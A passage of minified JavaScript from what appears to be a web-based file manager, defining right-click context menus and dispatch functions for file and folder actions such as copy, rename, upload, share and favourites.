        g = function() {
            $.contextMenu({
                selector: ".menu-empty",
                className: "hidden",
                zIndex: 9999,
                items: {
                    " ": {
                        name: LNG.open,
                        className: "hidden"
                    }
                },
                callback: function() {}
            })
        },
        b = function() {
            $.contextMenu({
                selector: ".menu-default",
                zIndex: 9999,
                items: {
                    open: {
                        name: LNG.open,
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    }
                },
                callback: function(e) {
                    switch (e) {
                        case "open":
                            ui.path.open();
                            break;
                        default:
                    }
                }
            })
        },
        y = function() {
            $.contextMenu({
                selector: Config.BodyContent,
                zIndex: 9999,
                callback: function(e) {
                    S(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    newfolder: {
                        name: LNG.newfolder + "<b>Alt+M</b>",
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    "new-file-other": d["new-file-other"],
                    sep1: "--------",
                    upload: {
                        name: LNG.upload + "<b>Ctrl+U</b>",
                        className: "upload",
                        icon: "upload",
                        accesskey: "u"
                    },
                    past: {
                        name: LNG.past + "<b>Ctrl+V</b>",
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    "copy-see": {
                        name: LNG.clipboard,
                        className: "copy-see",
                        icon: "eye-open",
                        accesskey: "v"
                    },
                    sep2: "--------",
                    "sort-by": d["sort-by"],
                    "set-file-icon-size": d["set-file-icon-size"],
                    "app-install": {
                        name: LNG.app_store,
                        className: "app-install",
                        icon: "tasks",
                        accesskey: "a"
                    },
                    sep10: "--------",
                    "setting-wall": {
                        name: LNG.setting_wall,
                        className: "setting-wall",
                        icon: "picture",
                        accesskey: "b"
                    },
                    "setting-theme": {
                        name: LNG.setting_theme,
                        className: "setting-theme",
                        icon: "dashboard",
                        accesskey: "i"
                    },
                    setting: {
                        name: LNG.setting,
                        className: "setting",
                        icon: "cogs",
                        accesskey: "t"
                    }
                }
            })
        },
        k = function() {
            $.contextMenu({
                zIndex: 9999,
                selector: ".toolbar-path-more",
                className: "menu-tool-path menu-not-auto-hidden",
                callback: function(e) {
                    A(e), $(".toolbar-path-more").removeClass("active")
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep0: "--------",
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "folder-open-alt",
                        accesskey: "o"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    past: {
                        name: LNG.past + "<b>Ctrl+V</b>",
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    rname: {
                        name: LNG.rename + "<b>F2</b>",
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove + "<b>Delete</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        className: "more-action",
                        accesskey: "m",
                        items: {
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav ",
                                icon: "star",
                                accesskey: "f"
                            },
                            "open-browser": {
                                name: LNG.open_ie,
                                className: "open-browser",
                                icon: "globe",
                                accesskey: "b"
                            },
                            sep103: "--------",
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            },
                            "create-link": {
                                name: LNG.createLink,
                                className: "create-link",
                                icon: "share-alt"
                            },
                            "create-project": {
                                name: LNG.createProject,
                                className: "create-project",
                                icon: "plus"
                            },
                            "open-project": {
                                name: LNG.openProject,
                                className: "open-project",
                                icon: "edit"
                            }
                        }
                    },
                    sep5: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        x = function() {
            $.contextMenu({
                zIndex: 9999,
                selector: ".tool-path-newfile",
                className: "tool-path-newfile",
                callback: function(e) {
                    A(e)
                },
                items: d["new-file-other"].items
            })
        },
        w = function() {
            $.contextMenu({
                zIndex: 9999,
                selector: ".tool-path-upload",
                className: "tool-path-upload",
                callback: function(e) {
                    switch (core.upload(), e) {
                        case "upload-file":
                            $(".dialog-file-upload").hide(), setTimeout(function() {
                                $("#picker .webuploader-element-invisible").click()
                            }, 100);
                            break;
                        case "upload-folder":
                            $(".dialog-file-upload").hide(), setTimeout(function() {
                                $(".drag-upload-folder").click()
                            }, 100);
                            break;
                        case "server-download":
                            $(".tab-download").click(), $(".download-box input").focus();
                            break;
                        default:
                    }
                },
                items: {
                    "upload-file": {
                        name: LNG.file,
                        icon: "-",
                        className: "upload"
                    },
                    "upload-folder": {
                        name: LNG.folder,
                        icon: "-",
                        className: "upload upload-folder"
                    },
                    sep2: "--------",
                    "server-download": {
                        name: LNG.download_from_server,
                        icon: "-",
                        className: "download"
                    }
                }
            }), $.isIE() && $(".tool-path-upload .upload,.tool-path-upload .context-menu-separator").addClass("hidden"), $.supportUploadFolder() || $(".tool-path-upload .upload.upload-folder").addClass("hidden")
        },
        N = function() {
            $('<i class="' + a.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: a,
                className: a.substr(1),
                callback: function(e) {
                    A(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "folder-open-alt",
                        accesskey: "o"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    rname: {
                        name: LNG.rename + "<b>F2</b>",
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    "open-browser": {
                        name: LNG.open_ie,
                        className: "open-browser",
                        icon: "globe",
                        accesskey: "b"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        className: "more-action",
                        accesskey: "m",
                        items: {
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav ",
                                icon: "star",
                                accesskey: "f"
                            },
                            sep103: "--------",
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            },
                            "create-link": {
                                name: LNG.createLink,
                                className: "create-link",
                                icon: "share-alt"
                            },
                            "create-project": {
                                name: LNG.createProject,
                                className: "create-project",
                                icon: "plus"
                            },
                            "open-project": {
                                name: LNG.openProject,
                                className: "open-project",
                                icon: "edit"
                            }
                        }
                    },
                    sep5: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        L = function() {
            $('<i class="' + t.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: t,
                className: t.substr(1),
                callback: function(e) {
                    A(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    "open-with": {
                        name: LNG.open_with,
                        icon: "external-link",
                        className: "open-with",
                        accesskey: "a",
                        items: {
                            "open-with-first": {
                                name: "",
                                className: "hidden open-with-first"
                            }
                        }
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    share: {
                        name: LNG.share,
                        className: "share",
                        icon: "share-sign",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    rname: {
                        name: LNG.rename + "<b>F2</b>",
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    "open-browser": {
                        name: LNG.open_ie,
                        className: "open-browser",
                        icon: "globe",
                        accesskey: "b"
                    },
                    "set-background": {
                        name: LNG.set_background,
                        className: "set-background",
                        icon: "picture",
                        accesskey: "x"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        className: "more-action",
                        accesskey: "m",
                        items: {
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            sep104: "--------",
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            },
                            "create-link": {
                                name: LNG.createLink,
                                className: "create-link",
                                icon: "share-alt"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        C = function() {
            $('<i class="' + i.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: i,
                className: i.substr(1),
                callback: function(e) {
                    A(e)
                },
                items: {
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    sep001: "--------",
                    remove: {
                        name: LNG.remove + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep1: "--------",
                    "copy-to": {
                        name: LNG.copy_to,
                        className: "copy-to",
                        icon: "copy"
                    },
                    "cute-to": {
                        name: LNG.cute_to,
                        className: "cute-to",
                        icon: "cut"
                    },
                    sep2: "--------",
                    clone: {
                        name: LNG.clone + "<b>Ctrl+C</b>",
                        className: "clone",
                        icon: "external-link",
                        accesskey: "n"
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        _ = function() {
            $('<i class="menu-group-root"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-group-root",
                callback: function(e) {
                    A(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    sep1: "--------",
                    fav: {
                        name: LNG.add_to_fav,
                        className: "fav",
                        icon: "star",
                        accesskey: "f"
                    },
                    "create-link-home": {
                        name: LNG.createLinkHome,
                        className: "create-link-home",
                        icon: "location-arrow",
                        accesskey: "l"
                    }
                }
            }), $('<i class="menu-group-root-more"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-group-root-more",
                callback: function(e) {
                    A(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    }
                }
            })
        },
        T = function() {
            $('<i class="menu-fav-path"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-fav-path",
                callback: function(e) {
                    A(e)
                },
                items: {
                    open: {
                        name: LNG.open + "<b>Enter</b>",
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    sep0: "--------",
                    "fav-remove": {
                        name: LNG.fav_remove,
                        className: "fav-remove",
                        icon: "trash",
                        accesskey: "r"
                    },
                    "fav-page": {
                        name: LNG.manage_fav,
                        className: "fav-page",
                        icon: "star",
                        accesskey: "f"
                    },
                    sep1: "--------",
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menu-fav-path-more"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-fav-path-more",
                className: "menu-fav-path-more",
                callback: function(e) {
                    A(e)
                },
                items: {
                    "fav-remove": {
                        name: LNG.fav_remove,
                        className: "fav-remove",
                        icon: "trash",
                        accesskey: "r"
                    }
                }
            })
        },
        S = function(e) {
            switch (e) {
                case "refresh":
                    ui.f5(!0, !0);
                    break;
                case "back":
                    ui.path.history.back();
                    break;
                case "next":
                    ui.path.history.next();
                    break;
                case "set-icon":
                    ui.setListType("icon");
                    break;
                case "set-list":
                    ui.setListType("list");
                    break;
                case "set-split":
                    ui.setListType("split");
                    break;
                case "set-sort-name":
                    ui.setListSort("name", 0);
                    break;
                case "set-sort-ext":
                    ui.setListSort("ext", 0);
                    break;
                case "set-sort-size":
                    ui.setListSort("size", 0);
                    break;
                case "set-sort-mtime":
                    ui.setListSort("mtime", 0);
                    break;
                case "set-sort-up":
                    ui.setListSort(0, "up");
                    break;
                case "set-sort-down":
                    ui.setListSort(0, "down");
                    break;
                case "upload":
                    core.upload(), $(".dialog-file-upload").hide(), setTimeout(function() {
                        $("#picker .webuploader-element-invisible").click()
                    }, 100);
                    break;
                case "recycle-clear":
                    ui.path.recycleClear();
                    break;
                case "box-size-smallx":
                    ui.setFileIconSize(40);
                    break;
                case "box-size-small":
                    ui.setFileIconSize(60);
                    break;
                case "box-size-default":
                    ui.setFileIconSize(80);
                    break;
                case "box-size-big":
                    ui.setFileIconSize(100);
                    break;
                case "box-size-bigx":
                    ui.setFileIconSize(120);
                    break;
                case "past":
                    ui.path.past();
                    break;
                case "copy-see":
                    ui.path.clipboard();
                    break;
                case "newfolder":
                    ui.path.newFolder();
                    break;
                case "newfile":
                    ui.path.newFile("txt");
                    break;
                case "newfile-null":
                    ui.path.newFile("");
                    break;
                case "newfile-md":
                    ui.path.newFile("md");
                    break;
                case "newfile-html":
                    ui.path.newFile("html");
                    break;
                case "newfile-php":
                    ui.path.newFile("php");
                    break;
                case "newfile-js":
                    ui.path.newFile("js");
                    break;
                case "newfile-css":
                    ui.path.newFile("css");
                    break;
                case "newfile-oexe":
                    ui.path.newFile("oexe");
                    break;
                case "newfile-docx":
                    ui.path.newFile("docx");
                    break;
                case "newfile-xlsx":
                    ui.path.newFile("xlsx");
                    break;
                case "newfile-pptx":
                    ui.path.newFile("pptx");
                    break;
                case "info":
                    ui.path.info();
                    break;
                case "open":
                    ui.path.open();
                    break;
                case "app-install":
                    ui.path.appList();
                    break;
                case "setting":
                    core.setting();
                    break;
                case "setting-theme":
                    core.setting("theme");
                    break;
                case "setting-wall":
                    core.setting("wall");
                    break;
                default:
            }
        },
        A = function(e) {
            switch (e) {
                case "open":
                    ui.path.open();
                    break;
                case "down":
                    ui.path.download();
                    break;
                case "share":
                    ui.path.share();
                    break;
                case "open-browser":
                    ui.path.openWindow();
                    break;
                case "share-edit":
                    ui.path.shareEdit();
                    break;
                case "share-open-window":
                    ui.path.shareOpenWindow();
                    break;
                case "share-open-path":
                    ui.path.shareOpenPath();
                    break;
                case "fav":
                    ui.path.fav();
                    break;
                case "search":
                    ui.path.search();
                    break;
                case "copy":
                    ui.path.copy();
                    break;
                case "clone":
                    ui.path.copyDrag(G.thisPath, !0);
                    break;
                case "cute":
                    ui.path.cute();
                    break;
                case "cute-to":
                    ui.path.cuteTo();
                    break;
                case "copy-to":
                    ui.path.copyTo();
                    break;
                case "remove":
                    ui.path.remove();
                    break;
                case "rname":
                    ui.path.rname();
                    break;
                case "set-background":
                    ui.path.setBackground();
                    break;
                case "create-link-home":
                    ui.path.createLink(!1);
                    break;
                case "create-link":
                    ui.path.createLink(!0);
                    break;
                case "create-project":
                    ui.path.createProject();
                    break;
                case "open-project":
                    ui.path.openProject();
                    break;
                case "explorer":
                    ui.path.explorer();
                    break;
                case "explorer-new":
                    ui.path.explorerNew();
                    break;
                case "fav-page":
                    core.setting("fav");
                    break;
                case "fav-remove":
                    ui.path.favRemove();
                    break;
                case "info":
                    ui.path.info();
                    break;
                default:
                    S(e)
            }
        },
        E = function() {
            $('<i class="menu-tree-fav-root"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-tree-fav-root",
                callback: function(e) {
                    M(e)
                },
                items: {
                    "fav-page": {
                        name: LNG.manage_fav,
                        className: "fav-page",
                        icon: "star",
                        accesskey: "r"
                    },
                    sep1: "--------",
                    refresh: {
                        name: LNG.refresh,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    }
                }
            }), $('<i class="menu-tree-fav"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-tree-fav",
                callback: function(e) {
                    M(e)
                },
                items: {
                    "fav-remove": {
                        name: LNG.fav_remove,
                        className: "fav-remove",
                        icon: "trash",
                        accesskey: "r"
                    },
                    "fav-page": {
                        name: LNG.manage_fav,
                        className: "fav-page",
                        icon: "star",
                        accesskey: "f"
                    },
                    sep2: "--------",
                    "create-link-home": {
                        name: LNG.createLinkHome,
                        className: "create-link-home",
                        icon: "location-arrow",
                        accesskey: "l"
                    },
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    info: {
                        name: LNG.info,
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        D = function() {
            $('<i class="' + n.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: n,
                callback: function(e) {
                    M(e)
                },
                items: {
                    explorer: {
                        name: LNG.manage_folder,
                        className: "explorer",
                        icon: "laptop",
                        accesskey: "v"
                    },
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    newfile: {
                        name: LNG.newfile,
                        className: "newfile",
                        icon: "file-text-alt",
                        accesskey: "j"
                    },
                    sep2: "--------",
                    fav: {
                        name: LNG.add_to_fav,
                        className: "fav",
                        icon: "star",
                        accesskey: "f"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    }
                }
            })
        },
        j = function() {
            $('<i class="menu-tree-folder"></i>').appendTo("#rightMenu"), $('<i class="menu-tree-folder-fav"></i>').appendTo("#rightMenu");
            var e = {
                zIndex: 9999,
                selector: ".menu-tree-folder",
                callback: function(e) {
                    M(e)
                },
                items: {
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    "open-browser": {
                        name: LNG.open_ie,
                        className: "open-browser",
                        icon: "globe"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        items: {
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            share: {
                                name: LNG.share,
                                className: "share",
                                icon: "share-sign",
                                accesskey: "e"
                            },
                            sep105: "--------",
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            },
                            "open-project": {
                                name: LNG.openProject,
                                className: "open-project",
                                icon: "edit"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info + '<b class="ml-20"></b>',
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            };
            $.contextMenu(e);
            var t = {
                "fav-remove": {
                    name: LNG.fav_remove,
                    className: "fav-remove",
                    icon: "trash",
                    accesskey: "r"
                },
                "fav-page": {
                    name: LNG.manage_fav,
                    className: "fav-page",
                    icon: "star",
                    accesskey: "f"
                },
                sep0: "--------"
            };
            e.selector = ".menu-tree-folder-fav", e.items = $.extend(t, e.items, !0), $.contextMenu(e)
        },
        z = function() {
            $('<i class="' + o.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: o,
                callback: function(e) {
                    M(e)
                },
                items: {
                    explorer: {
                        name: LNG.manage_folder,
                        className: "explorer",
                        icon: "laptop",
                        accesskey: "v"
                    },
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    refresh: {
                        name: LNG.refresh_tree,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    past: {
                        name: LNG.past,
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    newfolder: {
                        name: LNG.newfolder,
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    "new-file-other": d["new-file-other"],
                    search: {
                        name: LNG.search_in_path,
                        className: "search",
                        icon: "search",
                        accesskey: "s"
                    },
                    "open-browser": {
                        name: LNG.open_ie,
                        className: "open-browser",
                        icon: "globe"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        className: "more-action",
                        items: {
                            explorer: {
                                name: LNG.manage_folder,
                                className: "explorer",
                                icon: "laptop",
                                accesskey: "v"
                            },
                            clone: {
                                name: LNG.clone,
                                className: "clone",
                                icon: "external-link",
                                accesskey: "l"
                            },
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            share: {
                                name: LNG.share,
                                className: "share",
                                icon: "share-sign",
                                accesskey: "e"
                            },
                            sep106: "--------",
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            },
                            "open-project": {
                                name: LNG.openProject,
                                className: "open-project",
                                icon: "edit"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info + '<b class="ml-20">Alt+I</b>',
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        I = function() {
            $('<i class="' + r.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: r,
                callback: function(e) {
                    M(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh,
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    }
                }
            })
        },
        P = function() {
            $('<i class="' + l.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: l,
                callback: function(e) {
                    M(e)
                },
                items: {
                    fav: {
                        name: LNG.add_to_fav,
                        className: "fav",
                        icon: "star",
                        accesskey: "f"
                    },
                    "create-link-home": {
                        name: LNG.createLinkHome,
                        className: "create-link-home",
                        icon: "location-arrow",
                        accesskey: "l"
                    }
                }
            })
        },
        O = function() {
            $('<i class="' + c.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: c,
                callback: function(e, t) {
                    var a = t.$trigger;
                    a.hasClass("file") ? A(e) : M(e)
                },
                items: {
                    fav: {
                        name: LNG.add_to_fav,
                        className: "fav",
                        icon: "star",
                        accesskey: "f"
                    },
                    "create-link-home": {
                        name: LNG.createLinkHome,
                        className: "create-link-home",
                        icon: "location-arrow",
                        accesskey: "l"
                    }
                }
            })
        },
        R = function() {
            $('<i class="' + s.substr(1) + '"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                className: s.substr(1),
                selector: s,
                callback: function(e) {
                    M(e)
                },
                items: {
                    open: {
                        name: LNG.open,
                        className: "open",
                        icon: "external-link",
                        accesskey: "o"
                    },
                    "open-with": {
                        name: LNG.open_with,
                        icon: "external-link",
                        className: "open-with",
                        accesskey: "a",
                        items: {
                            "open-with-first": {
                                name: "",
                                className: "hidden open-with-first"
                            }
                        }
                    },
                    download: {
                        name: LNG.download,
                        className: "download",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    sep1: "--------",
                    copy: {
                        name: LNG.copy,
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    cute: {
                        name: LNG.cute,
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    rname: {
                        name: LNG.rename,
                        className: "rname",
                        icon: "pencil",
                        accesskey: "r"
                    },
                    remove: {
                        name: LNG.remove,
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    "open-browser": {
                        name: LNG.open_ie,
                        className: "open-browser",
                        icon: "globe"
                    },
                    clone: {
                        name: LNG.clone,
                        className: "clone",
                        icon: "external-link",
                        accesskey: "l"
                    },
                    others: {
                        name: LNG.more,
                        icon: "ellipsis-horizontal",
                        accesskey: "m",
                        className: "more-action",
                        items: {
                            fav: {
                                name: LNG.add_to_fav,
                                className: "fav",
                                icon: "star"
                            },
                            share: {
                                name: LNG.share,
                                className: "share",
                                icon: "share-sign",
                                accesskey: "e"
                            },
                            "create-link-home": {
                                name: LNG.createLinkHome,
                                className: "create-link-home",
                                icon: "location-arrow",
                                accesskey: "l"
                            }
                        }
                    },
                    sep3: "--------",
                    info: {
                        name: LNG.info + '<b class="ml-20">Alt+I</b>',
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
        M = function(e) {
            switch (e) {
                case "open":
                    ui.tree.open();
                    break;
                case "refresh":
                    ui.tree.refresh();
                    break;
                case "copy":
                    ui.tree.copy();
                    break;
                case "cute":
                    ui.tree.cute();
                    break;
                case "past":
                    ui.tree.past();
                    break;
                case "clone":
                    ui.tree.clone();
                    break;
                case "rname":
                    ui.tree.rname();
                    break;
                case "remove":
                    ui.tree.remove();
                    break;
                case "info":
                    ui.tree.info();
                    break;
                case "cute-to":
                    ui.tree.cuteTo();
                    break;
                case "copy-to":
                    ui.tree.copyTo();
                    break;
                case "download":
                    ui.tree.download();
                    break;
                case "open-browser":
                    ui.tree.openWindow();
                    break;
                case "search":
                    ui.tree.search();
                    break;
                case "share":
                    ui.tree.share();
                    break;
                case "search":
                    ui.tree.search();
                    break;
                case "newfolder":
                    ui.tree.create("folder");
                    break;
                case "newfile":
                    ui.tree.create("txt");
                    break;
                case "newfile-html":
                    ui.tree.create("html");
                    break;
                case "newfile-php":
                    ui.tree.create("php");
                    break;
                case "newfile-js":
                    ui.tree.create("js");
                    break;
                case "newfile-css":
                    ui.tree.create("css");
                    break;
                case "newfile-oexe":
                    ui.tree.create("oexe");
                    break;
                case "explorer":
                    ui.tree.explorer();
                    break;
                case "open-project":
                    ui.tree.openProject();
                    break;
                case "fav-page":
                    core.setting("fav");
                    break;
                case "fav":
                    ui.tree.fav();
                    break;
                case "create-link-home":
                    ui.tree.createLink(!1);
                    break;
                case "fav-remove":
                    ui.tree.favRemove();
                    break;
